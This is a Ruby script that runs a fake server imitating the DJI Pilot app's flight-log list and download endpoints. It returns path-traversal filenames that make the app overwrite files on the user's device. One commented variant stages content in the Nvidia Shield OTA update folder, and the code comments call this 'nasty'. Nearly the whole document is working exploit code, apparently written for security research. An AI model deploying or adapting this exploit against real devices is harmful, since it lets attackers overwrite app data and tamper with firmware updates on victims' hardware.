require 'webrick'
include WEBrick
require 'digest/md5'

s = HTTPServer.new( :Port => 9090, Logger: WEBrick::Log.new("/dev/null"), AccessLog: [] )
#s = HTTPServer.new( :Port => 9090, Logger: WEBrick::Log.new("/dev/null") )

puts "DJI Pilot.app Log spoofer / jacker has launched"

# http://54.243.252.105:9090/flight/download?token=thisisabullshittoken&filename=DJIFlightRecord_2015-01-11_%5B11-53-45%5D.txt
#FLIGHT_DOWNLOAD_LOVE = '{"Code":101,"ErrMsg":"parmas invalid, must pass userid and filename","FileList":null}'
FLIGHT_DOWNLOAD_LOVE = "owned" # This WILL replace the contents of any existing file, if permissions allow

#FLIGHT_DOWNLOAD_LOVE = "\xD8\u0000\u0000\u0000\u0000\u0000\u0000\u0000\x90\u0001\u0003\u0000\u00011rAx\xFF\xD3\xFE\xE4\xBE\xE8\xB7&\xB1=\xC8\xE0>\xCD\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xFA\xFF\u0011\u0000\f\u0006\u0006\u000Em\xD0\u0000\u0000\n\r\u0000\u0000\xF1\xCD\xF1\u001E\u0004\u001E\x8A\u0004\u0001\xFF\u0005\u0012\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xB4\x93\xC7T\u0000\u0000\u0000\u0000\xFF\u00011\u0011\xB2\xAD\xDC\xDD\xFE\xE4\xBEGG\xF1\xD33\xC8\xE0>\xCD\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xFA\xFF\u0011\u0000\f\u0006\u0006\u000Em\xD0\u0000\u0000\n\r\u0000\u0000\xF1\xCD\xF2\u001E\u0004\u001E\x8A\u0004\u0001\xFF\u0005\u0012\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xB4\x93\xC7T\u0000\u0000\u0000\u0000\xFF\u0004\r\u0000\u0004\u0000\u0004\u0000\u0004\u0000\u0004\u0000\u0004\u0000\x90\u0000\xFF\a#UJa\xF1\u000E\x94\u0011d\u0005\u0000\u0000 \u0000\u0000\xCE\xFD1\u0010;\u00108\u00105\u0010;\u00106\u0010o\u0001\x96E\x86\v\u0000\xFF90\u0000\u0000Map Loading\u0000\u0001\u0000?\u0000\x98Դ8Map Loading\u0000\u0010{{8\u0002\u0000\u0000\u0000Map Loading\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Map Loading\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0002\u0002\u0000\u0002\u0000\u0000\u000090\u0000\u0000\xB4\x93\xC7T\u0000\u0000\u0000\u0000n6\xE8\xDD\xCB\xCBB\xBFL\x804\xCFc\f>?\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\xCD\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xE1-\xDB`\u0001\n\u0000.11111111111111110000000000\u0001XXXXINSPIRE\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000ABCDEFGHIJ\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\t\u0001fL@?c\xF3\xB6\xA4\u0016'\"?\u0000\u0000\b\u0000\u0000)a8\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\xD0\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0019\u0000"
MD5SUM = Digest::MD5.hexdigest(FLIGHT_DOWNLOAD_LOVE)

class FLIGHT_DOWNLOAD < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = FLIGHT_DOWNLOAD_LOVE
   res['Content-Type'] = "application/octet-stream"
   puts "DJI Pilot.app sent a download request for the following file: #{req.query_string}"
 end
end


#FLIGHT_LIST_LOVE = '{"Code":0,"ErrMsg":"","FileList":[{"Md5":"' + MD5SUM + '","FileName":"DJIFlightRecord_2015-01-27_[13-33-40].txt","IsFavourite":2}]}' # <--- Sending this file will *currently* leave Pilot App in a *bad* state
FLIGHT_LIST_LOVE = '{"Code":0,"ErrMsg":"","FileList":[{"Md5":"' + MD5SUM + '","FileName":"../owned","IsFavourite":2}]}' # /sdcard/DJI/dji.pilot folder
#FLIGHT_LIST_LOVE = '{"Code":0,"ErrMsg":"","FileList":[{"Md5":"' + MD5SUM + '","FileName":"../../../../../../../../../../../../../data/data/dji.pilot/owned","IsFavourite":2}]}' # /data/data/dji.pilot/ folder

#FLIGHT_LIST_LOVE = '{"Code":0,"ErrMsg":"","FileList":[{"Md5":"' + MD5SUM + '","FileName":"../../../nvidia/app/ota/download/ROM","IsFavourite":2}]}' # /sdcard/nvidia/app/ota/download/ROM folder 
# This could be nasty... DJI is pushing for users to get the Nvidia Shield
# Move this file to /storage/sdcard0/nvidia/app/ota/download/ROM/ and delete other files if any.
# Shut down and restart your device. (OTA update should apply)

# http://54.243.252.105:9090/flight/list?token=thisisabullshittoken&page=0&pagesize=48
class FLIGHT_LIST < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = FLIGHT_LIST_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a flight list request for Profile Token: #{req.query_string}"
   puts "Sending file with MD5SUM of " + MD5SUM
 end
end

trap("INT"){ s.shutdown }
s.mount("/flight/list", FLIGHT_LIST)
s.mount("/flight/download", FLIGHT_DOWNLOAD)

s.start

